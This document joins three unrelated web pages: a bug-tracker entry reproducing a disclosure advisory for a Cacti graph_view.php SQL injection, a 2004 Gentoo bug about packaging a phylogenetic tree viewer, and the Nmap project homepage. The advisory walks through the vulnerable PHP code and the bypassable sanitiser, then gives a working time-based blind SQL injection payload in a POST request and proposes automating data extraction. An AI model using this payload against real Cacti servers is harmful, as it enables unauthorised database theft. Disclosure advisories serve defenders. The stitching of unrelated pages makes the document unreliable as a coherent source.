| [Description](show_bug.cgi?id=974013#c0)  Johannes Segitz   2016-04-05 09:09:51 UTC  ``` ========================== Advisory: Cacti graph_view.php SQL Injection Vulnerability Author: M3@pandas From DBAppSecurity Security Lab Email: xiaotian.wang@dbappsecurity.com.cn Affected Version: 0.8.8.g(the latest version & the older versions) ========================== Vulnerability Description ========================== Recetly, I found a SQL Injection Vulnerability in ‘Cacti' program,  Cacti is widely used in many companies.  Vulnerable file: /cacti/graph_view.php:  /* ================= input validation ================= */ input_validate_input_number(get_request_var_request('branch_id')); input_validate_input_number(get_request_var_request('hide')); input_validate_input_number(get_request_var_request('tree_id')); input_validate_input_number(get_request_var_request('leaf_id')); input_validate_input_number(get_request_var_request('rra_id')); input_validate_input_regex(get_request_var_request('graph_list'), '^([\,0-9]+)$'); input_validate_input_regex(get_request_var_request('graph_add'), '^([\,0-9]+)$'); input_validate_input_regex(get_request_var_request('graph_remove'), '^([\,0-9]+)$'); input_validate_input_regex(get_request_var_request('nodeid'), '^([_a-z0-9]+)$'); /* ==================================================== */ ... switch ($_REQUEST['action']) { case 'tree_content':     validate_tree_vars(); // attesion here ...         grow_right_pane_tree((isset($_REQUEST['tree_id']) ? $_REQUEST['tree_id'] : 0), (isset($_REQUEST['leaf_id']) ? $_REQUEST['leaf_id'] : 0), (isset($_REQUEST['host_group_data'])          ? urldecode($_REQUEST['host_group_data']) : 0));         //follow function grow_right_pane_tree() }  /lib/html_tree.php:  function grow_right_pane_tree($tree_id, $leaf_id, $host_group_data)  {     global $current_user, $config, $graphs_per_page, $graph_timeshifts;     ...     $host_group_data_array = explode(':', $host_group_data);       if ($host_group_data_array[0] == 'graph_template') {         $host_group_data_name = '<strong>Graph Template:</strong> ' . db_fetch_cell('select name from graph_templates where id=' . $host_group_data_array[1]); //here is a positive sql injection vul         $graph_template_id = $host_group_data_array[1];     }     ... }  Codes above seem to be a  sql injection vul, but function validate_tree_vars() is a powerful filtering function like this:  function validate_tree_vars() {     /* ================= input validation ================= */     input_validate_input_number(get_request_var_request('graphs'));     input_validate_input_number(get_request_var_request('columns'));     input_validate_input_number(get_request_var_request('page'));     input_validate_input_number(get_request_var_request('tree_id'));     input_validate_input_number(get_request_var_request('leaf_id'));     /* ==================================================== */      /* clean up search string */     if (isset($_REQUEST['filter'])) {         $_REQUEST['filter'] = sanitize_search_string(get_request_var_request('filter'));     }      /* clean up search string */     if (isset($_REQUEST['thumbnails'])) {         $_REQUEST['thumbnails'] = sanitize_search_string(get_request_var_request('thumbnails'));     }      /* clean up host_group_data string */     if (isset($_REQUEST['host_group_data'])) {         $_REQUEST['host_group_data'] = sanitize_search_string(get_request_var_request('host_group_data'));  Continue tracking function sanitize_search_string /lib/functions.php: function sanitize_search_string($string) {     static $drop_char_match =   array('^', '$', '<', '>', '`', '\'', '"', '|', ',', '?', '+', '[', ']', '{', '}', '#', ';', '!', '=', '*');     static $drop_char_replace = array(' ', ' ', ' ', ' ',  '',   '', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ');      /* Replace line endings by a space */     $string = preg_replace('/[\n\r]/is', ' ', $string);      /* HTML entities like &nbsp; */     $string = preg_replace('/\b&[a-z]+;\b/', ' ', $string);      /* Remove URL's */     $string = preg_replace('/\b[a-z0-9]+:\/\/[a-z0-9\.\-]+(\/[a-z0-9\?\.%_\-\+=&\/]+)?/', ' ', $string);      /* Filter out strange characters like ^, $, &, change "it's" to "its" */     for($i = 0; $i < count($drop_char_match); $i++) {         $string =  str_replace($drop_char_match[$i], $drop_char_replace[$i], $string);     }      return $string; }   This function filter seem to be very strict, but it can be bypassed by some mysql tips. Then I can achieve any data using this sql injection vul.    ========================== POC && EXP ========================== 1. Login 2. POST  <http://target/cacti/graph_view.php>    Data: ____csrf_magic=sid:b0349195c55bddec2f2be859e0f394539ea4569a,1458781575&host_group_data=graph_template:1 union select case when ord(substring((select version()) from 1 for 1)) between 53 and 53 then sleep(5) else 0 end      If response time returns more than 5 seconds, we can prove that the first string of mysql version() is 5. (ord(5)=53) then we can write python script to achieve data automatically instead of manual work.

| [Description](#c0)  Koen Deforche    2004-05-25 03:03:53 UTC  ``` Hello,  this is treeview, a phylogenetic tree viewer for Linux/Unix, Mac OS X, and Windows. It depends on wxGTK and uses the straight forward ebuild template. I suggest it to be included in the app-sci category.  Regards, koen ```  [Comment 1](#c1)  Koen Deforche    2004-05-25 03:04:54 UTC  ``` Created [attachment 31986](attachment.cgi?id=31986 "treeview-0.4.ebuild") [[details](attachment.cgi?id=31986&action=edit "treeview-0.4.ebuild")] treeview-0.4.ebuild ```  [Comment 2](#c2)  Olivier Fisette (RETIRED)   gentoo-dev  2004-05-27 18:26:51 UTC  ``` Created [attachment 32178](attachment.cgi?id=32178 "treeviewx-0.4.ebuild - Revised ebuild") [[details](attachment.cgi?id=32178&action=edit "treeviewx-0.4.ebuild - Revised ebuild")] treeviewx-0.4.ebuild - Revised ebuild  - Changed package name to treeviewx. - Added missing Gentoo copyright header. - Removed 'inherit flag-o-matic gnuconfig' since no inherited function was used. - Changed incorrect SRC_URI (fetch error). - Don't hardcode names in SRC_URI. - Don't mark a new ebuild stable (x86 -> ~x86). - Changed x11-libs/wxGTK dependency to =x11-libs/wxGTK-2.4.1* because it does not compile against version 2.4.2. I'll report this to the author. - Added necessary S variable definition. - Removed unnecessary src_unpack function. - make install DESTDIR=${D} is prefered to emake.  Thanks for this ebuild suggestion. Next time you submit something, please take the time to review the Common Gentoo Ebuild Mistakes document, and use repoman to check the ebuild. It will thus be easier for other people to test the package and it will be included in Portage more quickly. ```  [Comment 3](#c3)  Olivier Fisette (RETIRED)   gentoo-dev  2004-05-27 18:31:07 UTC  ``` Created [attachment 32179](attachment.cgi?id=32179 "metadata.xml") [[details](attachment.cgi?id=32179&action=edit "metadata.xml")] metadata.xml  Goes with 32178  - Assigns to the science herd. - Provides long description. ```  [Comment 4](#c4)  Olivier Fisette (RETIRED)   gentoo-dev  2004-08-08 09:28:57 UTC  ``` Now that we have concurrent wxGTK libraries with and without Unicode support, I think it is safe to add TreeView X to Portage. I commited a (revised) ebuild to the tree. ``` |  |

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).
